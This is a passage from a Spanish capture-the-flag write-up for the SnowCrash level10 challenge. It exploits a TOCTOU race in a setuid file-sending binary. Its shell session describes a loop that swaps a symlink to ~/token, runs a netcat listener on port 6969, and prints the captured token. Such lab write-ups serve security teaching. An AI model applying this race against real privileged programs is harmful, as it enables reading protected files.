1. **Busqueda de archivos**

    Entontramos otro binario `level10` que al ejecutarlo nos pide un `archivo`y `host`
    ```bash
    ./level10 file host
        sends file to host if you have access to it
    level10@SnowCrash:~$ ./level10 token localhost
    You don't have access to token
    ```
    Podemos ver por el strings que:
    - No es un demonio en escucha, sino un cliente TCP que hace
    socket()/connect() a puerto 6969 del host que le pasas.
    - Antes de abrir el fichero con open/read, hace un access() para
    comprobar permisos (“You don't have access to %s”).
    - Si access() pasa, luego se conecta y envía el contenido por la red.


2. **Explotación**

    Vamos a crear un script que haga lo siguiente:
    - Crear un toggle (bucle) que cambie rapidamente el destino de un enlace simbolico `/tmp/link` entre dos archivos diferentes
        - Uno es un archivo normal y legible `/tmp/ok`
        - El otro es el archivo protegido que queremos leer `~/token`
    El objetivo es que, durante la ejecucion del binario vulnerable `level10`, el enlace simbolico apunte al archivo protegido justo en el momento adecuado, explotando la vulnerabilidad de carrera `(TOCTOU)`

    ```bash
    level10@SnowCrash:~$ echo "OK" > /tmp/ok
    level10@SnowCrash:~$ chmod 644 /tmp/ok
    level10@SnowCrash:~$ chmod +x /tmp/exploit.sh
    level10@SnowCrash:~$ /tmp/exploit.sh
    You dont have access to /tmp/link
    Contenido: 
    /tmp/exploit.sh: line 14:  1809 Terminated              nc -l 6969 > /tmp/flag
    Connecting to 127.0.0.1:6969 .. Connected!
    Sending file .. wrote file!
    Contenido: woupa2yuojeeaaed06riuj63c
    ```

